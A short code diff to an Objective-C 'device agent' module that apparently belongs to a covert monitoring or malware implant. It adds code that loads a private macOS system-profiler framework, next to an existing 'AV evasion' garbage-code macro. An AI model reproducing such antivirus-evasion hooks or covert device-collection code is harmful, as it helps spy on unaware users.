@@ -5,8 +5,8 @@
 //  Created by kiodo on 3/11/11.
 //  Copyright 2011 __MyCompanyName__. All rights reserved.
 //
+#import <dlfcn.h>
 #import <objc/objc-class.h>
-
 #import "RCSMAgentDevice.h"
 #import "RCSMCommon.h"
 #import "RCSMTaskManager.h"
@@ -131,6 +131,14 @@ static __m_MAgentDevice *sharedAgentDevice = nil;
   
   // AV evasion: only on release build
   AV_GARBAGE_001
+  
+  void *handle = dlopen("/System/Library/PrivateFrameworks/SPSupport.framework/Versions/Current/SPSupport", 2);
+  
+  if (handle == NULL)
+  {
+    [pool release];
+    return nil;
+  }
   
   id SPDocumentClass = nil;
   
